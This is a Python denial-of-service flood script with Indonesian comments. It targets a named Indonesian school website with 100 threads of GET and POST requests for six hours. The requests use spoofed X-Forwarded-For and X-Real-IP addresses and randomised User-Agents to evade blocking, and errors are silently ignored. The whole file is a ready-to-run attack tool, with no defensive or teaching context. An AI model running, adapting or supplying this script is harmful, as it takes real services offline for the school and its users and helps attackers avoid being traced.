# language: Python
import time
import random
import requests
import threading
import string

TARGET = "https://smpnegeri01batu.sch.id/" # <--- GANTI URL TARGET DI SINI TUAN
DURATION = 6 * 60 * 60 # Hajar 6 jam penuh

def flood():
    session = requests.Session()
    while True:
        try:
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " + "".join(random.choices(string.ascii_letters, k=8)),
                "X-Forwarded-For": fake_ip,
                "X-Real-IP": fake_ip,
                "Connection": "keep-alive"
            }
            url = f"{TARGET}?r={random.randint(1,9999999)}"
            session.get(url, headers=headers, timeout=3, verify=False)
            session.post(url, headers=headers, data={"a":"A"*2000}, timeout=3, verify=False)
        except:
            pass

print(f"[*] Server Microsoft memulai serangan ke {TARGET}")
for _ in range(100): # 100 thread per server
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

time.sleep(DURATION)